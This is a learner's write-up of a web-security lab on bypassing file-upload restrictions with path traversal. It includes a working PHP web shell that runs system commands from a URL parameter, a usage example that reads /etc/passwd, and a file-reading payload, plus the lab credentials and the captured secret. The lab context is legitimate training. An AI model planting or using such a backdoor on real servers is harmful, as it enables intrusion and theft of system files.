This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

The app is turning the php code into plain text so i try to upload to a different directory with path traversal. 

![[Pasted image 20240916121727.png]]

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

![[Pasted image 20240916123413.png]]

```php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

```php
https://0adf0015032ec47481e3a80400e80049.web-security-academy.net/files/simple-backdoor.php?cmd=cat+/home/carlos/secret
```

`brT81souYmsxNS1TGAisaSiUQkKBGqIA`

